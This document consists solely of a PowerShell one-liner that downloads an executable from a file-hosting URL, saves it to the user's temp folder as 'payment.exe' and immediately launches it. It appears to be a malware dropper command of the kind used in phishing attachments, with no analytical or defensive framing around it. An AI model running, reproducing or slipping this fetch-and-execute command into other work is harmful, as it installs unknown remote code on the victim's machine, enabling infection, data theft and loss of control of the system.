
(New-Object System.Net.WebClient).DownloadFile('https://a.pomf.cat/yhggkj.exe',"$env:TEMP\payment.exe");Start-Process ("$env:TEMP\payment.exe")

